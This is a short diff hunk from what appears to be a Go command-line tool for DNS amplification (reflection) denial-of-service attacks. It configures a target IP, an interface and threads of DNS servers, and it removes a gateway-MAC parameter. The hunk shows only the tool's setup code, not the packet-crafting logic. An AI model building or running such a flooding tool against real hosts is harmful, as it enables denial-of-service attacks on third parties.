@@ -20,11 +20,7 @@ var duration = flag.Int("duration", 1, "The duration of the attack in seconds")
 func main() {
     flag.Parse()
     target := net.ParseIP(*targetIP)
-    dstMac, err := net.ParseMAC(*gatewayMAC)
-    if err != nil {
-        panic(err)
-    }
-    dnsamp.Configure(*iface, dstMac, target)
+    dnsamp.Configure(*iface, target)
     allServers := dnsamp.ReadFile(*filename)
     servers := make([][]dnsamp.Target, *numThreads)
     for i, server := range allServers {
